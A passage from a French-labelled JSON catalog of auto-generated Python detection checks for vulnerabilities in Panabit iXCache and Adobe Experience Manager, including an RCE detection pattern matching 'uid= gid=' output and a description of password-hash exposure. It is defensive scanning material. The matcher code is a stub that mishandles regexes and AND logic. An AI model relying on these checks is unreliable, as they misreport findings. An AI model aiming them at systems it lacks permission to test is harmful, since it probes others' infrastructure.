str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] regex ['uid=([0-9(a-z)]+) gid=([0-9(a-z)]+) groups=([0-9(a-z)]+)'] | mot(s) 'text/html' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['uid=([0-9(a-z)]+) gid=([0-9(a-z)]+) groups=([0-9(a-z)]+)', 'text/html']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Panabit iXCache date_config - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_panabit_ixcache_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "panabit",
          "rce",
          "ixcache",
          "intrusive",
          "iot",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_aem_crx_bypass",
        "name": "AEM Package Manager - Authentication Bypass",
        "language": "Python",
        "famille": "Misconfiguration",
        "description": "Adobe Experience Manager Package Manager is susceptible to a hard to exploit authentication bypass issue. This issue only potentially impacts AEM on-premise or AEM as a Managed Service if default security configurations are removed.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'buildCount, downloadName, acHandling' | mot(s) 'application/json' | status HTTP [200]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: aem-crx-bypass\nName: AEM Package Manager - Authentication Bypass\nSeverity: critical\nDescription: Adobe Experience Manager Package Manager is susceptible to a hard to exploit authentication bypass issue. This issue only potentially impacts AEM on-premise or AEM as a Managed Service if default security configurations are removed.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_aem_crx_bypass:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"aem-crx-bypass\"\n    SEVERITY = \"critical\"\n    NAME = \"AEM Package Manager - Authentication Bypass\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'buildCount, downloadName, acHandling' | mot(s) 'application/json' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['buildCount, downloadName, acHandling', 'application/json']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"AEM Package Manager - Authentication Bypass\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_aem_crx_bypass(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: aem-crx-bypass\nName: AEM Package Manager - Authentication Bypass\nSeverity: critical\nDescription: Adobe Experience Manager Package Manager is susceptible to a hard to exploit authentication bypass issue. This issue only potentially impacts AEM on-premise or AEM as a Managed Service if default security configurations are removed.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_aem_crx_bypass:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"aem-crx-bypass\"\n    SEVERITY = \"critical\"\n    NAME = \"AEM Package Manager - Authentication Bypass\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'buildCount, downloadName, acHandling' | mot(s) 'application/json' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['buildCount, downloadName, acHandling', 'application/json']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"AEM Package Manager - Authentication Bypass\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_aem_crx_bypass(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "aem",
          "adobe",
          "misconfig",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_aem_groovyconsole",
        "name": "AEM Groovy Console Discovery",
        "language": "Python",
        "famille": "Misconfiguration",
        "description": "An Adobe Experience Manager Groovy console was discovered. This can possibly lead to remote code execution.",
        "severity": "critical",
        "detection": "[AND] mot(s) '<title>Groovy Console</title>, Run Script, Groovy Web Console' | status HTTP [200]",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: aem-groovyconsole\nName: AEM Groovy Console Discovery\nSeverity: critical\nDescription: An Adobe Experience Manager Groovy console was discovered. This can possibly lead to remote code execution.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_aem_groovyconsole:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"aem-groovyconsole\"\n    SEVERITY = \"critical\"\n    NAME = \"AEM Groovy Console Discovery\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) '<title>Groovy Console</title>, Run Script, Groovy Web Console' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['<title>Groovy Console</title>, Run Script, Groovy Web Console']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"AEM Groovy Console Discovery\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_aem_groovyconsole(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: aem-groovyconsole\nName: AEM Groovy Console Discovery\nSeverity: critical\nDescription: An Adobe Experience Manager Groovy console was discovered. This can possibly lead to remote code execution.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_aem_groovyconsole:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"aem-groovyconsole\"\n    SEVERITY = \"critical\"\n    NAME = \"AEM Groovy Console Discovery\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) '<title>Groovy Console</title>, Run Script, Groovy Web Console' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['<title>Groovy Console</title>, Run Script, Groovy Web Console']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"AEM Groovy Console Discovery\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_aem_groovyconsole(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "aem",
          "adobe",
          "hackerone",
          "misconfig",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_aem_querybuilder_bypass",
        "name": "AEM QueryBuilder JSON Exposure - Bypass",
        "language": "Python",
        "famille": "Exposure",
        "description": "Adobe Experience Manager QueryBuilder endpoint allows unauthenticated attackers to extract sensitive user repository data, including password hashes from the rep:password field in /home/users. This vulnerability bypasses access controls and exposes bcrypt/SHA-256 password hashes through the querybuilder.json API, enabling potential credential compromise and account takeover attacks.",
        "severity": "critical",
        "detection": "[AND] mot(s) '\"rep:password\", \"success\":true, \"results\":' | status HTTP [200]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: aem-querybuilder-bypass\nName: AEM QueryBuilder JSON Exposure - Bypass\nSeverity: critical\nDescription: Adobe Experience Manager QueryBuilder endpoint allows unauthenticated attackers to extract sensitive user repository data, including password hashes from the rep:password field in /home/users. This vulnerability bypasses access controls and exposes bcrypt/SHA-256 password hashes through the querybuilder.json API, enabling potential credential compromise and account takeover attacks.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_aem_querybuilder_bypass:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"aem-querybuilder-bypass\"\n    SEVERITY = \"critical\"\n    NAME = \"AEM QueryBuilder JSON Exposure - Bypass\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = 